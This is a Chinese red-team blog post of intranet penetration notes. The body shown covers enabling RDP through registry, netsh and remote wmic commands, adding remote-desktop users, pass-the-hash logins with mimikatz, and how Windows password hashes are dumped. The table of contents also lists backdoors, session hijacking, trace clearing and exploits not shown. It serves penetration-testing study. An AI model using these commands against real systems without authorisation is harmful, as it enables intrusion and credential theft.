<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透备忘录"><meta name="keywords" content="红蓝对抗"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>内网渗透备忘录 | m0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="m0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACWindows%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.</span> <span class="toc-text">不同版本Windows开启RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.1.</span> <span class="toc-text">判断是否开启RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.2.</span> <span class="toc-text">通过注册表开启RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reg%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">reg文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd"><span class="toc-number">1.2.2.</span> <span class="toc-text">cmd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87wmic%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.3.</span> <span class="toc-text">通过wmic开启RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0Remote-Desktop-Users%E7%BB%84"><span class="toc-number">1.4.</span> <span class="toc-text">添加用户到Remote Desktop Users组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">RDP登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%98%8E%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">Windows 明文登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E4%BD%BF%E7%94%A8-Hash-%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.2.</span> <span class="toc-text">Windows 使用 Hash 登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mstsc"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">mstsc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz-%E6%8A%93%E5%8F%96hash"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">mimikatz 抓取hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%98%8E%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.3.</span> <span class="toc-text">Linux明文登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mac"><span class="toc-number">1.5.4.</span> <span class="toc-text">Mac</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Server-03"><span class="toc-number">1.6.</span> <span class="toc-text">Windows Server 03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Xp"><span class="toc-number">1.7.</span> <span class="toc-text">Windows Xp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-8"><span class="toc-number">1.8.</span> <span class="toc-text">Windows 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-2012"><span class="toc-number">1.9.</span> <span class="toc-text">Windows 2012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-7"><span class="toc-number">1.10.</span> <span class="toc-text">Windows 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-2016"><span class="toc-number">1.11.</span> <span class="toc-text">Windows 2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Server-2019"><span class="toc-number">1.12.</span> <span class="toc-text">Windows Server 2019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E7%9A%84Windows%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.13.</span> <span class="toc-text">非服务器版本的Windows系统支持多用户登录的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-number">1.13.1.</span> <span class="toc-text">1. 使用mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9termsrv-dll"><span class="toc-number">1.13.2.</span> <span class="toc-text">2. 修改termsrv.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8rdpwrap"><span class="toc-number">1.13.3.</span> <span class="toc-text">3. 使用rdpwrap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9ARDP%E6%9C%89%E6%95%88%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.14.</span> <span class="toc-text">确定RDP有效用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.14.1.</span> <span class="toc-text">明文密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP%E6%9A%B4%E7%A0%B4"><span class="toc-number">1.14.1.1.</span> <span class="toc-text">RDP暴破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB%E7%88%86%E7%A0%B4"><span class="toc-number">1.14.1.2.</span> <span class="toc-text">SMB爆破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash"><span class="toc-number">1.14.2.</span> <span class="toc-text">Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.15.</span> <span class="toc-text">RDP 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%B3%E9%97%ADRDP-%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81"><span class="toc-number">1.15.1.</span> <span class="toc-text">1. 关闭RDP 安全认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Shift%E5%90%8E%E9%97%A8-RDP-Session-%E5%8A%AB%E6%8C%81"><span class="toc-number">1.15.2.</span> <span class="toc-text">2. Shift后门 + RDP Session 劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E6%89%93%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.16.</span> <span class="toc-text">RDP 服务器反打客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AFRDP%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">1.17.</span> <span class="toc-text">开启RDP影子用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7%E9%9A%90%E8%97%8F%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="toc-number">1.17.1.</span> <span class="toc-text">影子用户隐藏登录界面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E8%BF%9E%E6%8E%A5%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">1.18.</span> <span class="toc-text">RDP 连接痕迹清除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-0708-BlueKeep"><span class="toc-number">1.19.</span> <span class="toc-text">CVE-2019-0708(BlueKeep)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.20.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96%E5%AF%BB%E6%89%BE%E5%9F%9F%E6%8E%A7%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">域外寻找域控思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E4%B8%AD%E5%90%8C%E6%97%B6%E5%BC%80%E6%94%BE389%E5%92%8C53%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%9C%BA%E5%99%A8%E3%80%8188%E5%92%8C389%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">扫描内网中同时开放389和53端口的机器、88和389端口</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96%E5%A6%82%E4%BD%95%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.</span> <span class="toc-text">域外如何打域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E6%98%AF%E4%BB%80%E4%B9%88%E6%96%B9%E6%B3%95%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">不知道是什么方法的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZeroLogon"><span class="toc-number">3.2.</span> <span class="toc-text">ZeroLogon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4"><span class="toc-number">3.3.</span> <span class="toc-text">账号密码暴破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AF%BB%E6%89%BE%E5%9F%9F%E6%8E%A7%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">域内寻找域控思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">常见的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2dns%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95"><span class="toc-number">4.2.</span> <span class="toc-text">查询dns解析记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPN-%E6%89%AB%E6%8F%8F"><span class="toc-number">4.3.</span> <span class="toc-text">SPN 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AdFind-exe"><span class="toc-number">4.4.</span> <span class="toc-text">AdFind.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="toc-number">4.5.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cobalt-Strike-stageless-%E5%92%8C-stage-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.</span> <span class="toc-text">Cobalt Strike stageless 和 stage 的区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8C-%E7%BC%96%E8%AF%91-shellcode-%E5%85%8D%E6%9D%80exe"><span class="toc-number">6.</span> <span class="toc-text">使用C 编译 shellcode 免杀exe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90shellcode"><span class="toc-number">6.1.</span> <span class="toc-text">生成shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEvisual-stdio-2019"><span class="toc-number">6.2.</span> <span class="toc-text">配置visual stdio 2019</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">m0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">Talk</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">内网渗透备忘录</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-21</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">9.1k</span><span class="post-meta__separator">|</span><span>Reading time: 41 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>[toc]</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210624111457.png"></p>
<p>欢迎关注公众号，以后博客不更新了，文章都在公众号发。</p>
<a id="more"></a>



<h1 id="不同版本Windows开启RDP"><a href="#不同版本Windows开启RDP" class="headerlink" title="不同版本Windows开启RDP"></a>不同版本Windows开启RDP</h1><p>可以连接到运行以下 Windows 操作系统的电脑：</p>
<ul>
<li>Windows 10 专业版</li>
<li>Windows 10 企业版</li>
<li>Windows 8 企业版</li>
<li>Windows 8 专业版</li>
<li>Windows 7 专业版</li>
<li>Windows 7 企业版</li>
<li>Windows 7 旗舰版</li>
<li>Windows 7 旗舰版</li>
<li><strong>Windows 2008 Server</strong></li>
<li><strong>Windows Server 2008 R2</strong></li>
<li><strong>Windows Server 2012</strong></li>
<li><strong>Windows Server 2012 R2</strong></li>
<li><strong>Windows Server 2016</strong></li>
<li>Windows Multipoint Server 2011</li>
<li>Windows Multipoint Server 2012</li>
<li>Windows Small Business Server 2008</li>
<li>Windows Small Business Server 2011</li>
</ul>
<p>以下计算机可以运行远程桌面网关：</p>
<ul>
<li>Windows 2008 Server</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2016</li>
<li>Windows Small Business Server 2011</li>
</ul>
<p>以下操作系统可用作 RD Web 访问或 RemoteApp 服务器：</p>
<ul>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2016</li>
</ul>
<p>远程桌面客户端不会连接到以下 Windows 版本：</p>
<ul>
<li>Windows 7 简易版</li>
<li>Windows 7 家庭版</li>
<li>Windows 8 家庭版</li>
<li>Windows 8.1 家庭版</li>
<li>Windows 10 家庭版</li>
</ul>
<h2 id="判断是否开启RDP"><a href="#判断是否开启RDP" class="headerlink" title="判断是否开启RDP"></a>判断是否开启RDP</h2><p><em>默认情况下，Window XP和 server 2003上的远程桌面未启用</em> ，通过下面的注册表查询可以知道目标机器是否开启了RDP服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections </span><br><span class="line"># 查看RDP服务是否开启：1关闭，0开启 </span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line"># 查看RDP服务的端口</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113523181.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113556564.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114128380.png)</p>
<p>16进制 d3d 就是 10进制的 3389</p>
<p>方法二，通过查看进程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;svc | find &quot;TermService&quot; # 找到对应服务进程的PID</span><br><span class="line">netstat -ano | find &quot;844&quot; # 找到进程对应的端口号</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114506770.png)</p>
<h2 id="通过注册表开启RDP"><a href="#通过注册表开启RDP" class="headerlink" title="通过注册表开启RDP"></a>通过注册表开启RDP</h2><h3 id="reg文件"><a href="#reg文件" class="headerlink" title="reg文件"></a>reg文件</h3><p>第一种方法也是用”echo”命令写入一个 3389.reg文件，再”regedit /s 3389.reg”导入注册表文件即可开启，比较简单。将如下代码一行一行地复制到cmdshell窗口后按回车执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;3389.reg</span><br><span class="line">echo. &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000 &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsdpwdTds cp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br></pre></td></tr></table></figure>

<p>完成以上操作后再执行”regedit /s 3389.reg”导入注册表即可生效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">版本	Windows 10 专业版</span><br><span class="line">版本号	21H1</span><br><span class="line">安装日期	2021&#x2F;6&#x2F;19</span><br><span class="line">操作系统内部版本	19043.928</span><br><span class="line">体验	Windows Feature Experience Pack 120.2212.551.0</span><br></pre></td></tr></table></figure>

<p>出现了UAC</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621115651613.png)</p>
<h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621120045039.png)</p>
<p>因此，要想开启RDP，首先是获得了系统的管理员权限。</p>
<p><strong>注：</strong></p>
<p>如果修改连接端口，<strong>系统重启后才能生效</strong></p>
<p><strong>补充</strong></p>
<p><strong>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口</strong></p>
<p>修改防火墙配置，允许3389端口的命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h2 id="通过wmic开启RDP"><a href="#通过wmic开启RDP" class="headerlink" title="通过wmic开启RDP"></a>通过wmic开启RDP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node: &quot;192.168.1.160&quot; &#x2F;USER:&quot;192.168.1.160\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码</span><br></pre></td></tr></table></figure>



<h2 id="添加用户到Remote-Desktop-Users组"><a href="#添加用户到Remote-Desktop-Users组" class="headerlink" title="添加用户到Remote Desktop Users组"></a>添加用户到Remote Desktop Users组</h2><p>查看本地所有工作组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure>

<p>查看Administrator组内的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure>

<p>查看Remote Desktop Users组内的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot;</span><br></pre></td></tr></table></figure>

<p>赋予非administrator组用户远程桌面登录权限，也即把目标用户加入Remote Desktop Users组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;add </span><br></pre></td></tr></table></figure>

<p>此后username具有远程登录的权限，登录完成后将username在Remote Desktop Users组中删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;del</span><br></pre></td></tr></table></figure>



<h2 id="RDP登录"><a href="#RDP登录" class="headerlink" title="RDP登录"></a>RDP登录</h2><h3 id="Windows-明文登录"><a href="#Windows-明文登录" class="headerlink" title="Windows 明文登录"></a>Windows 明文登录</h3><ol>
<li>mstsc.exe</li>
<li>mstsc.exe /console /v:ip/admin   # 如果登录用户数量达到限制，可以使用该命令强制踢出一个用户</li>
</ol>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621195256529.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200056069.png)</p>
<p>被踢下线</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200125104.png)</p>
<h3 id="Windows-使用-Hash-登录"><a href="#Windows-使用-Hash-登录" class="headerlink" title="Windows 使用 Hash 登录"></a>Windows 使用 Hash 登录</h3><h4 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h4><p>Server需要开启 <strong>Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；Client需要支持 Restricted Admin mode</strong>，当前系统不支持，链接时将出现如下：</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202739352.png)</p>
<p>可以通过如下命令开启 Restricted Admin mode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>查看是否已经开启</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure>

<p>开启后使用：mstsc.exe /restrictedadmin 进行登录不需要密码，将使用当前用户的hash进行验证</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202945033.png)</p>
<p>还有一个条件就是本地有rdp的凭据，不然就会下面这样</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621203044329.png)</p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ol>
<li>mimikatz.exe # 需要管理员权限</li>
<li>privilege::debug</li>
<li>sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d “/run:mstsc.exe /restrictedadmin”</li>
</ol>
<h4 id="mimikatz-抓取hash"><a href="#mimikatz-抓取hash" class="headerlink" title="mimikatz 抓取hash"></a>mimikatz 抓取hash</h4><p>在Windows2000以后，Windows机器都用NTLM算法在本地保存用户的密码，密码的NTLM哈希保存在<code>%SystemRoot%\System32\config\SAM</code>文件中。 Windows操作系统通常使用两种方法对用户的密码进行哈希处理，即 LAN Manager（LM）哈希和 NT LAN Manager（NTLM）哈希。所谓哈希（Hash），即使用一种加密方法对明文密码进行加密，对一个任意长度的字符串数据进行一次加密运算，都可以返回一个固定长度的字符串。Windows加密过的密码口令，我们称之为Hash。</p>
<p>Windows操作系统中的密码一般由两部分组成：一部分为LM Hash，另一部分为NTLM Hash。在Windows中，Hash的结构通常如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username:RID:LM-Hash:NT-Hash</span><br></pre></td></tr></table></figure>

<p>在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值。</p>
<p>在渗透测试中，通常可<strong>从Windows系统中的SAM文件和域控的NTDS.dit文件（在域环境中，用户信息存储在NTDS.dit中）中获得所有用户的Hash。也可以通过Mimikatz读取lsass.exe进程获得已登录用户的NTLM hash和明文值 。</strong></p>
<blockquote>
<p>注：但是在安装了KB2871997补丁或者系统版本大于win10或windows server 2012时，默认在内存缓存中禁止保存明文密码，这样利用mimikatz就不能从内存中读出明文密码了，但可以通过修改注册表的方式抓取明文。</p>
</blockquote>
<p>Mimikatz读取明文密码和hash也时最常用的方法。需要管理员权限。</p>
